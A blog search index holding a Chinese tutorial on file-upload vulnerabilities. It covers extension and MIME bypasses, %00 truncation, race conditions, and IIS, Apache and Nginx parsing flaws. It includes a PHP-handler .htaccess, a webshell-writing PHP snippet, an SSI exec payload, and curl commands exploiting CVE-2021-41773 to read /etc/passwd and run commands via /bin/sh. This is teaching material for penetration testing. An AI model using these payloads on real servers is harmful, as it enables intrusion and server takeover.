<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-文件上传漏洞基础"><a href="#1-文件上传漏洞基础" class="headerlink" title="1 文件上传漏洞基础"></a>1 文件上传漏洞基础</h1><p>文件上传漏洞是指在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户可以上传恶意的脚本文件，有可能获取执行服务端命令的能力。</p><blockquote><p>这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><h2 id="1-1-文件上传实战思路"><a href="#1-1-文件上传实战思路" class="headerlink" title="1.1 文件上传实战思路"></a>1.1 文件上传实战思路</h2><p>文件上传和文件执行是两个东西。</p><p><strong>思路：</strong></p><p>如果有一个网站，要从文件上传的方向开始；</p><p>先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;；</p><p>如果有，如何找：字典扫描，扫描会员中心等可能存在文件上传的位置。</p><p>找到后，如何利用：验证&#x2F;绕过。</p><h1 id="2-文件上传绕过分类"><a href="#2-文件上传绕过分类" class="headerlink" title="2 文件上传绕过分类"></a>2 文件上传绕过分类</h1><h2 id="2-1-前端检测"><a href="#2-1-前端检测" class="headerlink" title="2.1 前端检测"></a>2.1 前端检测</h2><p>主要是通过<code>javascript</code>代码进行检测，非常容易绕过。</p><p><strong>操作</strong>：</p><p>F12查看相关代码，删除引用相关js函数的代码，或修改返回值为true，或禁用js等。</p><h2 id="2-2-黑名单"><a href="#2-2-黑名单" class="headerlink" title="2.2 黑名单"></a>2.2 黑名单</h2><p>黑名单就是服务端明确不让上传的文件后缀，例如：rar、php、zip等。</p><h3 id="2-2-1-特殊后缀"><a href="#2-2-1-特殊后缀" class="headerlink" title="2.2.1 特殊后缀"></a>2.2.1 特殊后缀</h3><p>特殊解析后缀绕过是由于黑名单过滤规则不严谨，在某些特定的情况下的后缀也能够被当作php文件进行解析，例如PHP2、php3、php4、phtml、pht等情况。</p><p><strong>php</strong>：<code>php、php3、php4、php5、php7、pht、phtml、phar</code>，在配置文件夹中需要将AddType application&#x2F;x-httpd-php .php .phtml .phps .php1 .php4 .pht 这样的一段话前面的注释删除，重启phpstudy让其生效。</p><blockquote><p>ASP：asa、cer、cdx<br>ASPX：ascx、ashx、asac<br>JSP：jspx、jspf</p></blockquote><h3 id="2-2-2-htaccess解析-Apache"><a href="#2-2-2-htaccess解析-Apache" class="headerlink" title="2.2.2 .htaccess解析 (Apache)"></a>2.2.2 .htaccess解析 (Apache)</h3><p><strong>原理</strong>：</p><p>.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，如果网站开启了.htaccess功能，攻击者可能上传.htaccess文件覆盖apache文件解析规则，从而导致解析漏洞产生。</p><p><strong>操作</strong>：</p><p>上传.htaccess文件，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思是把任意文件都当做php文件解析。如果双引号内写入”x.jpg”，意思是把该目录下的x.jpg当做php文件解析。</p><p>再上传图片马x.jpg，访问该图片即可。</p><h3 id="2-2-3-大小写绕过"><a href="#2-2-3-大小写绕过" class="headerlink" title="2.2.3 大小写绕过"></a>2.2.3 大小写绕过</h3><p>服务端未将后缀进行统一的格式转换，同时由于Windows系统对后缀大小写并不敏感，所以将PHP改成Php也会被当作PHP进行解析。</p><h3 id="2-2-4-点绕过-Windows"><a href="#2-2-4-点绕过-Windows" class="headerlink" title="2.2.4 点绕过 (Windows)"></a>2.2.4 点绕过 (Windows)</h3><p>利用了Windows对文件和文件名的限制，当将点放在结尾的时候，就会触发操作系统的命名规范问题，所以在生成文件的时候，添加在结尾的点就会被去除。</p><p><strong>操作</strong>：</p><p>抓包拦截，在文件名后加一个点。例如：<code>1.php.</code> 。</p><blockquote><p>部分情况下，过滤是一次性的，只删除一次点，可以抓包并在文件名后添加<strong>点空格点</strong>来绕过。</p></blockquote><h3 id="2-2-5-空格绕过-Windows"><a href="#2-2-5-空格绕过-Windows" class="headerlink" title="2.2.5 空格绕过 (Windows)"></a>2.2.5 空格绕过 (Windows)</h3><p>有些web后端没有对文件名进行去除空格处理，而黑名单中又没有对这样的文件后缀名过滤，当我们上传一个类似于<code>1.php空格  </code>的文件这样就会成功上传到服务器的目录中。在服务器中，空格会被系统自动去除。</p><p><strong>操作</strong>：</p><p>抓包拦截，文件名后加空格，例如：<code>1.php空格</code> 。</p><h3 id="2-2-6-DATA绕过-Windows"><a href="#2-2-6-DATA绕过-Windows" class="headerlink" title="2.2.6 ::$DATA绕过 (Windows)"></a>2.2.6 ::$DATA绕过 (Windows)</h3><p>在window中，如果文件名后加上”<code>::$DATA</code>“，会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名。</p><p><strong>操作</strong>：</p><p>抓包拦截，在文件名后加<code>::$DATA</code>，例如：<code>1.php::$DATA</code> 。</p><h3 id="2-2-7-双写绕过"><a href="#2-2-7-双写绕过" class="headerlink" title="2.2.7 双写绕过"></a>2.2.7 双写绕过</h3><p>服务端可能存在将后缀替换为空的情况，但是可能只过滤了一次，所以就出现了可以通过双写绕过的可能。</p><p>过滤是从左到右进行匹配。所以可以把php双写成pphphp。</p><h2 id="2-3-白名单"><a href="#2-3-白名单" class="headerlink" title="2.3 白名单"></a>2.3 白名单</h2><p>白名单就是服务端明确可以上传的格式后缀，例如：jpg、png、jpeg等。</p><h3 id="2-3-1-MIME绕过"><a href="#2-3-1-MIME绕过" class="headerlink" title="2.3.1 MIME绕过"></a>2.3.1 MIME绕过</h3><p>服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。所以修改content-type就可以绕过。</p><blockquote><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><table><thead><tr><th align="left">文件扩展名</th><th align="left">Mime-Type</th></tr></thead><tbody><tr><td align="left">.js</td><td align="left">application&#x2F;x-javascript</td></tr><tr><td align="left">.html</td><td align="left">text&#x2F;html</td></tr><tr><td align="left">.jpg</td><td align="left">image&#x2F;jpeg</td></tr><tr><td align="left">.png</td><td align="left">image&#x2F;png</td></tr><tr><td align="left">.pdf</td><td align="left">application&#x2F;pdf</td></tr><tr><td align="left">.xml</td><td align="left">test&#x2F;xml</td></tr><tr><td align="left">.xhtml</td><td align="left">application&#x2F;xhtml+xml</td></tr><tr><td align="left">.xls</td><td align="left">application&#x2F;vnd.ms-excel</td></tr><tr><td align="left">.txt</td><td align="left">text&#x2F;plain</td></tr><tr><td align="left">.rtf</td><td align="left">application&#x2F;rtf</td></tr><tr><td align="left">.pdf</td><td align="left">application&#x2F;pdf</td></tr><tr><td align="left">.word .doc</td><td align="left">application&#x2F;msword</td></tr><tr><td align="left">.au</td><td align="left">audio&#x2F;basic</td></tr></tbody></table><p><strong>操作</strong>:</p><p>上传文件，抓包拦截，将Content-Type的值修改为image&#x2F;jpeg等允许的类型。</p><h3 id="2-3-2-00截断"><a href="#2-3-2-00截断" class="headerlink" title="2.3.2 %00截断"></a>2.3.2 %00截断</h3><p>%00不是代表空格，而是null，一个空字符，当程序执行到%00后，后面的数据就会停止，意思就是误当作结束符，把后面的数据直接忽略了，这就会导致漏洞产生。</p><p>文件上传时，文件扩展名验证会对包含%00后面的整个扩展名进行验证，但保存时只保存%00前面的文件名。</p><p><strong>环境</strong></p><blockquote><p>php&lt;5.3，magic_quotes_gpc&#x3D;off</p></blockquote><p><strong>操作</strong></p><p>上传图片马，抓包拦截，如果文件名在请求包的第一行URL中(请求行)，修改为<code>1.php%00</code>，保存后的文件名为1.php；如果文件名在下方请求体中，在文件名后加任意一个字符(以数字1为例)，点击Hex来查看16进制的请求包，找到刚才添加的字符位置，将其（1的16进制为31）改为00，放行，或者在文件名后加上%00，选中%00，右键-&gt;转换选中内容-&gt;URL-&gt;URL解码。</p><h2 id="2-4-内容及其他"><a href="#2-4-内容及其他" class="headerlink" title="2.4 内容及其他"></a>2.4 内容及其他</h2><h3 id="2-4-1-文件头检测"><a href="#2-4-1-文件头检测" class="headerlink" title="2.4.1 文件头检测"></a>2.4.1 文件头检测</h3><p>文件头是文件开头的一段二进制码，不同类型的图片也就会有不同的二进制头。</p><blockquote><p>JPEG (jpg)，文件头：FF D8 FF E0 (E0~EF)<br>PNG (png)，文件头：89 50 4E 47 (�PNG)<br>GIF (gif)，文件头：47 49 46 38 39 61 (GIF89a)</p></blockquote><h3 id="2-4-2-二次渲染"><a href="#2-4-2-二次渲染" class="headerlink" title="2.4.2 二次渲染"></a>2.4.2 二次渲染</h3><p> 二次渲染就是在我们上传的图片后，网站会对图片进行二次处理，比如对图片的尺寸、格式、以及网站对图片进行定义的一些要求等进行处理，并且服务器会对里面的内容进行二次替换更新，在处理完后，会生成一个合规的图片在网站上显示出来。</p><p><strong>操作</strong></p><p>把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。</p><h3 id="2-4-3-条件竞争"><a href="#2-4-3-条件竞争" class="headerlink" title="2.4.3 条件竞争"></a>2.4.3 条件竞争</h3><p>在源代码中是存在校验的，但是校验是在文件上传后，才开始校验，也就是文件先上传至服务器中，然后服务器会对该文件进行校验，当符合的时候则会对文件进行重命名，当文件不符合要求的时候就对将文件进行删除。</p><p>在服务器对文件删除前进行访问，由于文件在访问过程中，服务器是无法删除的，所以就可以利用这个节点实现条件竞争。</p><p><strong>操作</strong></p><p>上传的文件内容可以为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是新建一个shell.php文件。</p><h3 id="2-4-4-突破getimagesize"><a href="#2-4-4-突破getimagesize" class="headerlink" title="2.4.4 突破getimagesize"></a>2.4.4 突破getimagesize</h3><p><code>getimagesize</code>函数是用于获取图像大小及相关信息，成功返回一个数组，失败则返回false产生一条e_warning级的错误信息。</p><p>通过对图片及代码进行合成为图片马，这个时候getimagesize函数既可以获取图片信息，配合解析漏洞，将图片马当作php文件解析，从而绕过getimagesize函数的限制。</p><h3 id="4-5-突破exif-imagetype"><a href="#4-5-突破exif-imagetype" class="headerlink" title="4.5 突破exif_imagetype"></a>4.5 突破exif_imagetype</h3><p><code>exif_imagetype()</code>读取图像的第一个字节并检查其签名。当找到正确的签名时，将返回适当的常量值，否则返回值为FALSE。 </p><p>可以通过制作图片马绕过，再配合文件包含漏洞解析文件来获取服务器配置信息。</p><hr><h1 id="3-解析漏洞"><a href="#3-解析漏洞" class="headerlink" title="3 解析漏洞"></a>3 解析漏洞</h1><p>解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</p><h2 id="3-1-IIS解析漏洞"><a href="#3-1-IIS解析漏洞" class="headerlink" title="3.1 IIS解析漏洞"></a>3.1 IIS解析漏洞</h2><h3 id="3-1-1-IIS5-0-6-0"><a href="#3-1-1-IIS5-0-6-0" class="headerlink" title="3.1.1 IIS5.0&#x2F;6.0"></a>3.1.1 IIS5.0&#x2F;6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>在以.asp为文件夹名的文件夹下的任何文件都将作为asp文件执行。</p><p>也就是当目录为XX.asp的时候，那么当访问该目录下的图片的时候，如XX.aps&#x2F;1.jpg就会被当作ASP执行。</p><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>如果文件名为<code>1.asp;.jpg</code>，由于IIS不解析<code>;</code>后面的内容，就会把文件当作1.asp进行解析，同时还存在.asa、.cer、.cdx也可以进行解析。</p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>限制上传目录的执行权限，不允许执行脚本。</li><li>不允许创建目录。</li><li>上传的文件进行重命名。</li></ol><h3 id="3-1-2-IIS7-0-IIS7-5"><a href="#3-1-2-IIS7-0-IIS7-5" class="headerlink" title="3.1.2 IIS7.0&#x2F;IIS7.5"></a>3.1.2 IIS7.0&#x2F;IIS7.5</h3><h4 id="IIS7-0-IIS7-5-Fast-CGI"><a href="#IIS7-0-IIS7-5-Fast-CGI" class="headerlink" title="IIS7.0&#x2F;IIS7.5 Fast-CGI"></a>IIS7.0&#x2F;IIS7.5 Fast-CGI</h4><p>由于php配置文件中<code>cgi.fix_pathinfo=1</code>，文件不存在时会修正路径向前递归解析，因此导致访问文件时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式执行。例如：1.jpg&#x2F;.php会被当做php解析。</p><p><strong>环境</strong></p><blockquote><ol><li><p>php.ini里的cgi.fix_pathinfo&#x3D;1</p></li><li><p>IIS7在FastCGl运行模式下</p></li></ol></blockquote><p><strong>操作</strong></p><p>上传图片马，访问该图片时，图片名后加&#x2F;.php。</p><p>或者 图片马内容包含以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问后，新建一个shell.php。</p><h2 id="3-2-Apache解析漏洞"><a href="#3-2-Apache解析漏洞" class="headerlink" title="3.2 Apache解析漏洞"></a>3.2 Apache解析漏洞</h2><blockquote><p>参考教程：<a href="https://blog.csdn.net/qq_32277727/article/details/136141702">https://blog.csdn.net/qq_32277727/article/details/136141702</a></p></blockquote><h3 id="3-2-1-Apache换行解析漏洞"><a href="#3-2-1-Apache换行解析漏洞" class="headerlink" title="3.2.1 Apache换行解析漏洞"></a>3.2.1 Apache换行解析漏洞</h3><p>漏洞编号：CVE-2017-15715</p><p>版本：2.4.0~2.4.29</p><p><strong>原理</strong>：</p><p>在解析PHP时，1.php\x0A将被当做PHP进行解析，导致绕过一些服务器的安全策略。</p><p><strong>操作</strong>：</p><p>上传php文件，Burpsuite抓包拦截，在文件名后加任意一个字符（以数字1为例），点击Hex来查看这个请求包的16进制模式，找到刚才添加的任意字符所在位置，将其对应的16进制（1的16进制为31）改为<strong>0a</strong>，再放行该请求即可。访问*&#x2F;1.php%0a能够成功解析。</p><h3 id="3-2-2-Apache多后缀解析漏洞"><a href="#3-2-2-Apache多后缀解析漏洞" class="headerlink" title="3.2.2 Apache多后缀解析漏洞"></a>3.2.2 Apache多后缀解析漏洞</h3><p><strong>原理</strong>：</p><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，比如配置文件中有这项的话：<code>AddHandler application/x-httpd-php .php</code>，在有多个后缀的情况下，只要一个文件含有.php后缀的文件就会被识别成PHP文件,没必要是最后一个后缀。</p><p>此外，apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会从后向前解析，直到遇到能够解析的后缀名为止。</p><p>多用于绕过黑名单的检查。</p><p><strong>操作</strong>：</p><p>上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，文件内容可以是<code>&lt;?=phpinfo()?&gt;</code>。</p><h3 id="3-2-3-特殊后缀解析"><a href="#3-2-3-特殊后缀解析" class="headerlink" title="3.2.3 特殊后缀解析"></a>3.2.3 特殊后缀解析</h3><p><strong>原理</strong>：</p><p>以php5.6为例，php配置文件中正则表达式”<code>.+\.ph(p[3457]?|t|tml)$</code>“匹配到以<code>php、php3、php4、php5、php7、pht、phtml</code>后缀名结尾的文件时会把文件交给php解析器执行。同理，对于php7.4，默认可匹配的后缀名有：<code>phar、php、phtml</code>。</p><h3 id="3-2-4-htaccess解析漏洞"><a href="#3-2-4-htaccess解析漏洞" class="headerlink" title="3.2.4 .htaccess解析漏洞"></a>3.2.4 .htaccess解析漏洞</h3><p><strong>原理</strong>：</p><p>.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，如果网站开启了.htaccess功能，攻击者可能上传.htaccess文件覆盖apache文件解析规则，从而导致解析漏洞产生。</p><p><strong>操作</strong>：</p><p>上传.htaccess文件，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思是把任意文件都当做php文件解析。如果双引号内写入”x.jpg”，意思是把该目录下的x.jpg当做php文件解析。</p><p>再上传图片马x.jpg，访问该图片即可。</p><h3 id="3-2-5-Apache-SSI-远程命令执行漏洞"><a href="#3-2-5-Apache-SSI-远程命令执行漏洞" class="headerlink" title="3.2.5 Apache SSI 远程命令执行漏洞"></a>3.2.5 Apache SSI 远程命令执行漏洞</h3><p><strong>原理</strong>：</p><p>如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用。</p><p><strong>操作</strong>：</p><p>上传一个<code>shell.shtml</code>文件，内容为：<br>﻿﻿<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>﻿，ls命令可以列出当前目录所有文件。</p><h3 id="3-2-6-Apache文件读取-命令执行漏洞"><a href="#3-2-6-Apache文件读取-命令执行漏洞" class="headerlink" title="3.2.6 Apache文件读取&amp;命令执行漏洞"></a>3.2.6 Apache文件读取&amp;命令执行漏洞</h3><p>漏洞编号：CVE-2021-41773</p><p>版本：2.4.49</p><p><strong>原理</strong>：</p><p>在2.4.49版本中，如果设置了穿越的目录允许被访问（默认情况下是不允许的），就可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p><strong>操作</strong>：</p><p>cmd执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取文件：</span></span><br><span class="line">curl -v --path-as-is http://192.168.200.3:8080/一个可以访问的目录/.%2e/.%2e/.%2e/.%2e/etc/passwd  <span class="comment">#点的url编码为%2e，或者.%2e可以替换为.%%32%65</span></span><br><span class="line"><span class="comment"># 执行命令whoami：</span></span><br><span class="line">curl -v --data <span class="string">&quot;echo;whoami&quot;</span> <span class="string">&#x27;http://192.168.200.3:8080/一个可以访问的目录/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-2-7-Apache路径穿越漏洞"><a href="#3-2-7-Apache路径穿越漏洞" class="headerlink" title="3.2.7 Apache路径穿越漏洞"></a>3.2.7 Apache路径穿越漏洞</h3><p>漏洞编号：CVE-2021-42013</p><p>版本：2.4.49 、 2.4.50</p><p><strong>原理</strong>：</p><p>由 CVE-2021-41773 修复不完整导致，攻击者可以使用路径遍历攻击将 URL 映射到类别名指令配置的目录之外的文件。</p><p><strong>操作</strong>：</p><p>cmd执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取文件：</span><br><span class="line">curl -v --path-as-is http://192.168.200.3:8080/一个可访问的目录/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-3-Nginx解析漏洞"><a href="#3-3-Nginx解析漏洞" class="headerlink" title="3.3 Nginx解析漏洞"></a>3.3 Nginx解析漏洞</h2><h3 id="3-3-1-空字节代码执行漏洞"><a href="#3-3-1-空字节代码执行漏洞" class="headerlink" title="3.3.1 空字节代码执行漏洞"></a>3.3.1 空字节代码执行漏洞</h3><p>版本：0.5.x、0.6.x、 0.7 &lt;&#x3D; 0.7.65、 0.8 &lt;&#x3D; 0.8.37</p><p><strong>原理</strong>：</p><p>低版本Nginx在遇到%00空字节时因为与后端FastCGI处理不一致，导致末尾包含空字节%00的文件时也能被按照php后缀解析执行。攻击者可以上传图片马xxx.jpg，通过访问<code>xxx.jpg%00.php</code>来执行其中的代码。</p><h3 id="3-3-2-文件名逻辑漏洞"><a href="#3-3-2-文件名逻辑漏洞" class="headerlink" title="3.3.2 文件名逻辑漏洞"></a>3.3.2 文件名逻辑漏洞</h3><p>漏洞编号：CVE-2013-4547</p><p>版本：0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p><p><strong>原理</strong>：</p><p>该漏洞存在于Nginx对于PHP的配置上，如果配置不当，容易使得Nginx实现对%00等特殊字符解析出现问题，造成Nginx将特殊构造的URL交给PHP来进行处理，而Nginx则因为特殊字符的问题，无法接收含有特殊字符的URL或者是造成了在%00位置处的截断，从而造成了客户上传的文件被当作PHP代码来解析。</p><p><strong>操作</strong>：</p><p>图片马内容为：<code>&lt;?php phpinfo(); ?&gt;</code>。</p><p>上传图片马shell.jpg，抓包拦截，将文件名重名为：shell.jpga，先用a进行占位，之后通过16进制修改为20（空格），放行。</p><blockquote><p>这时的文件名为 shell.jpg0x20 。</p></blockquote><p>访问该图片，抓包拦截，把图片名改为<code>shell.jpgaa.php</code>，把aa通过16进制修改为20（空格）和00（截断符），放行可看到phpinfo信息。</p><h3 id="3-3-3-PHP-CGI解析漏洞"><a href="#3-3-3-PHP-CGI解析漏洞" class="headerlink" title="3.3.3 PHP CGI解析漏洞"></a>3.3.3 PHP CGI解析漏洞</h3><p><strong>原理</strong>：</p><p>Nginx以FastCGI模式解析PHP，PHP-FPM是FastCGI的进程管理器，Nginx将请求内容按照FastCGI协议格式封装，通过TCP报文传输给PHP-FPM解析。PHP-FPM将数据还原，执行SCRIPT_FILENAME变量值指向的PHP文件。但由于默认php配置文件中cgi.fix_pathinfo参数的作用，文件不存在时会修正路径向前递归解析，因此导致访问文件时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式执行。</p><p><strong>操作</strong></p><p>上传shell.jpg，访问”&#x2F;shell.jpg&#x2F;1.php”。</p><h3 id="3-3-4-user-ini"><a href="#3-3-4-user-ini" class="headerlink" title="3.3.4 .user.ini"></a>3.3.4 .user.ini</h3><p><strong>要求</strong>：</p><ul><li><p>服务器脚本语言为PHP，并且使用CGI&#x2F;FastCGI模式，php版本&gt;5.3.0</p></li><li><p>上传目录下要有可执行的php文件</p></li></ul><p><strong>原理</strong>：</p><p>.user.ini会影响php.ini中的配置，从而将指定的文件内容按php来解析，影响的范围为该文件所在的目录以及子目录。需要等待php.ini中的user_ini.cache_ttl设置的时间或重启Apache才能生效，且只在php5.3.0之后的版本才生效。可用于Nginx、Apache、IIS，Apache中的.htaccess文件有同样的效果（.htaccess只能用于Apache）。</p><p>php.ini中有以下两行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 用户自定义的php.ini文件的名字，默认是.user.ini</span><br><span class="line">user_ini.filename = <span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">; 重新读取用户INI文件的时间间隔，默认是<span class="number">300</span>秒（<span class="number">5</span>分钟）</span><br><span class="line">user_ini.cache_ttl = <span class="number">300</span></span><br></pre></td></tr></table></figure><p><strong>操作</strong>：</p><p>先上传一个﻿.user.ini﻿文件，这个文件的内容为<code>auto_prepend_file=xxx.jpg</code>，再上传一个图片马xxx.jpg，起到的作用相当于在可执行的php文件前插入图片马中的内容。访问上传目录中已经存在的可执行php文件即可。</p><h1 id="4-编辑器漏洞"><a href="#4-编辑器漏洞" class="headerlink" title="4 编辑器漏洞"></a>4 编辑器漏洞</h1><p>编辑器也就是在线的web编辑器，比如在搭建博客后需要发布文章，那么用来发布文章的界面就是web编辑器。当然web编辑器有很多，如：UEDITOR（百度）、eWebEdit、FCKeditor、CKEditor（新版fck）、Kindeditor、DotNetTextBox、CuteEditor等等。</p><blockquote><p>相关资料：</p><p>编辑器漏洞详解：<a href="https://blog.csdn.net/qq_40806924/article/details/118307640">https://blog.csdn.net/qq_40806924/article/details/118307640</a></p></blockquote><h1 id="5-WAF绕过"><a href="#5-WAF绕过" class="headerlink" title="5 WAF绕过"></a>5 WAF绕过</h1><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： <em>WAF</em>）</p><h2 id="5-1-HTTP文件上传数据包解析"><a href="#5-1-HTTP文件上传数据包解析" class="headerlink" title="5.1 HTTP文件上传数据包解析"></a>5.1 HTTP文件上传数据包解析</h2><p>文件上传实质上还是客户端的POST请求，消息主体是一些上传信息。前端上传页面需要指定 enctype 为<code>multipart/form-data</code>才能正常上传文件。</p><p>正常的文件上传数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://www.example.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryyb1zYhTI38xpQxBK</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;city_id&quot;</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">1</span></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;company_id&quot;</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">2</span></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;chrome.png&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">PNG ... content of chrome.png ...</span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK--</span></span><br></pre></td></tr></table></figure><p>请求头中Content-Type存在以下特征：</p><ul><li><p><code>multipart/form-data</code>：表示该请求是一个文件上传请求。</p></li><li><p>存在<code>boundary</code>字符串：作用为分隔符，以区分POST数据。</p></li></ul><p>请求体存在以下特征：</p><ul><li><p><code>Content-Disposition</code>：指示如何处理响应的内容以及如何呈现给用户。例如指定是否应该直接显示在浏览器中、弹出下载对话框，或者在页面内嵌显示。</p></li><li><p><code>name</code>：包含该字段的内容引用的 HTML 字段的名称。</p></li><li><p><code>filename</code>：后面是一个包含传输文件的原始名称的字符串。</p></li><li><p>POST请求体中的<code>boundary</code>的值就是<code>Content-Type</code>的值在最前面加了两个<code>-</code>，除了最后标识结束的<code>boundary</code>。</p></li><li><p>最后标识结束的<code>boundary</code>最后默认会多出两个<code>-</code>（测试时，最后一行的boundary删掉也能成功上传）。</p></li></ul><h3 